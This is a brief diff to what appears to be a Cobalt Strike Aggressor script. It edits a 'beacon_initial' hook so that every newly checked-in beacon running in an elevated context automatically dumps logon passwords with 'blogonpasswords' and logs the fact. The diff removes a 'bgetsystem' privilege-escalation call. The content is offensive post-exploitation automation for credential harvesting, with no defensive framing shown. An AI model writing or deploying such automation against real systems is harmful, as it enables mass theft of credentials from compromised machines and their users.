@@ -23,7 +23,6 @@ on beacon_initial {
   $b = "*";
   if ($b isin $a)
     {
-    bgetsystem($1);
     blogonpasswords($1);
     beacon_note($1, "Elevated Context: Ran LogonPasswords");
     }
